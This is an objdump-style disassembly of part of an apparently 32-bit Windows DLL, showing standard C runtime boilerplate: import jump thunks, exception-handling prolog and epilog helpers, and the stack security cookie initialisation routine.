10002684:	ff 25 d0 30 00 10    	jmp    *0x100030d0
1000268a:	ff 25 d4 30 00 10    	jmp    *0x100030d4
10002690:	ff 25 dc 30 00 10    	jmp    *0x100030dc
10002696:	cc                   	int3
10002697:	cc                   	int3
10002698:	68 f1 26 00 10       	push   $0x100026f1
1000269d:	64 ff 35 00 00 00 00 	push   %fs:0x0
100026a4:	8b 44 24 10          	mov    0x10(%esp),%eax
100026a8:	89 6c 24 10          	mov    %ebp,0x10(%esp)
100026ac:	8d 6c 24 10          	lea    0x10(%esp),%ebp
100026b0:	2b e0                	sub    %eax,%esp
100026b2:	53                   	push   %ebx
100026b3:	56                   	push   %esi
100026b4:	57                   	push   %edi
100026b5:	a1 00 40 00 10       	mov    0x10004000,%eax
100026ba:	31 45 fc             	xor    %eax,-0x4(%ebp)
100026bd:	33 c5                	xor    %ebp,%eax
100026bf:	50                   	push   %eax
100026c0:	89 65 e8             	mov    %esp,-0x18(%ebp)
100026c3:	ff 75 f8             	push   -0x8(%ebp)
100026c6:	8b 45 fc             	mov    -0x4(%ebp),%eax
100026c9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
100026d0:	89 45 f8             	mov    %eax,-0x8(%ebp)
100026d3:	8d 45 f0             	lea    -0x10(%ebp),%eax
100026d6:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
100026dc:	c3                   	ret
100026dd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100026e0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100026e7:	59                   	pop    %ecx
100026e8:	5f                   	pop    %edi
100026e9:	5f                   	pop    %edi
100026ea:	5e                   	pop    %esi
100026eb:	5b                   	pop    %ebx
100026ec:	8b e5                	mov    %ebp,%esp
100026ee:	5d                   	pop    %ebp
100026ef:	51                   	push   %ecx
100026f0:	c3                   	ret
100026f1:	8b ff                	mov    %edi,%edi
100026f3:	55                   	push   %ebp
100026f4:	8b ec                	mov    %esp,%ebp
100026f6:	ff 75 14             	push   0x14(%ebp)
100026f9:	ff 75 10             	push   0x10(%ebp)
100026fc:	ff 75 0c             	push   0xc(%ebp)
100026ff:	ff 75 08             	push   0x8(%ebp)
10002702:	68 44 1f 00 10       	push   $0x10001f44
10002707:	68 00 40 00 10       	push   $0x10004000
1000270c:	e8 b9 00 00 00       	call   0x100027ca
10002711:	83 c4 18             	add    $0x18,%esp
10002714:	5d                   	pop    %ebp
10002715:	c3                   	ret
10002716:	8b ff                	mov    %edi,%edi
10002718:	55                   	push   %ebp
10002719:	8b ec                	mov    %esp,%ebp
1000271b:	83 ec 10             	sub    $0x10,%esp
1000271e:	a1 00 40 00 10       	mov    0x10004000,%eax
10002723:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10002727:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000272b:	53                   	push   %ebx
1000272c:	57                   	push   %edi
1000272d:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
10002732:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
10002737:	3b c7                	cmp    %edi,%eax
10002739:	74 0d                	je     0x10002748
1000273b:	85 c3                	test   %eax,%ebx
1000273d:	74 09                	je     0x10002748
1000273f:	f7 d0                	not    %eax
10002741:	a3 04 40 00 10       	mov    %eax,0x10004004
10002746:	eb 60                	jmp    0x100027a8
10002748:	56                   	push   %esi
10002749:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000274c:	50                   	push   %eax
1000274d:	ff 15 58 30 00 10    	call   *0x10003058
10002753:	8b 75 fc             	mov    -0x4(%ebp),%esi
10002756:	33 75 f8             	xor    -0x8(%ebp),%esi
10002759:	ff 15 4c 30 00 10    	call   *0x1000304c
1000275f:	33 f0                	xor    %eax,%esi
10002761:	ff 15 5c 30 00 10    	call   *0x1000305c
10002767:	33 f0                	xor    %eax,%esi
10002769:	ff 15 60 30 00 10    	call   *0x10003060
1000276f:	33 f0                	xor    %eax,%esi
10002771:	8d 45 f0             	lea    -0x10(%ebp),%eax
10002774:	50                   	push   %eax
10002775:	ff 15 64 30 00 10    	call   *0x10003064
1000277b:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000277e:	33 45 f0             	xor    -0x10(%ebp),%eax
10002781:	33 f0                	xor    %eax,%esi
10002783:	3b f7                	cmp    %edi,%esi
10002785:	75 07                	jne    0x1000278e
10002787:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
1000278c:	eb 0b                	jmp    0x10002799
1000278e:	85 f3                	test   %esi,%ebx
10002790:	75 07                	jne    0x10002799
10002792:	8b c6                	mov    %esi,%eax
10002794:	c1 e0 10             	shl    $0x10,%eax
10002797:	0b f0                	or     %eax,%esi
10002799:	89 35 00 40 00 10    	mov    %esi,0x10004000
1000279f:	f7 d6                	not    %esi
100027a1:	89 35 04 40 00 10    	mov    %esi,0x10004004
100027a7:	5e                   	pop    %esi
100027a8:	5f                   	pop    %edi
100027a9:	5b                   	pop    %ebx
100027aa:	c9                   	leave
100027ab:	c3                   	ret
100027ac:	ff 25 e0 30 00 10    	jmp    *0x100030e0
100027b2:	ff 25 e4 30 00 10    	jmp    *0x100030e4
100027b8:	ff 25 a4 30 00 10    	jmp    *0x100030a4
100027be:	ff 25 a0 30 00 10    	jmp    *0x100030a0
100027c4:	ff 25 9c 30 00 10    	jmp    *0x1000309c
100027ca:	ff 25 90 30 00 10    	jmp    *0x10003090
100027d0:	ff 25 8c 30 00 10    	jmp    *0x1000308c
100027d6:	ff 25 94 30 00 10    	jmp    *0x10003094
